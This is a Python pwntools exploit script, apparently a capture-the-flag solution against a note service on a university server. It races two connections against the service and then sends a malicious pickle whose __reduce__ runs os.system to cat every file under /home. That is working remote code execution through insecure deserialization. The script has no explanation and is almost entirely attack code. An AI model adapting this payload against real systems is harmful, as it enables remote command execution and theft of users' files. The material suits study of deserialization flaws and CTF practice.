from pwn import *
import os
from multiprocessing import Process
import pickle

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25653

class rce:
    def __reduce__(self):
        return (os.system, ("find /home -type f -exec cat \\{\\} \\;",))
    
def classy_note():
    s = remote(SERVER, PORT, timeout=9999)
    time.sleep(0.5)
    s.recv(4096).decode()
    s.sendline(b'exploit')
    time.sleep(0.5)
    s.recv(4096).decode()
    s.sendline(b'0')
    time.sleep(0.5)
    s.recv(4096).decode()
    time.sleep(2)
    s.sendline(b'0')
    time.sleep(0.5)
    s.recv(4096).decode()
    s.sendline(b'exploit')
    time.sleep(0.5)
    r = s.recv(4096).decode()
    if "SSof{" in r:
        print(r)
 
process = Process(target=classy_note)
process.start() 

s = remote(SERVER, PORT, timeout=9999)
time.sleep(0.5)
s.recv(4096).decode()
s.sendline(b'exploit')
time.sleep(0.5)
s.recv(4096).decode()
s.sendline(b'1')
time.sleep(0.5)
s.recv(4096).decode()
time.sleep(1)
s.sendline(b'1')
time.sleep(0.5)
s.recv(4096).decode()
s.sendline(b'exploit')
time.sleep(0.5)
s.recv(4096).decode()
s.sendline(pickle.dumps(rce()))
s.sendline(b'\n')
    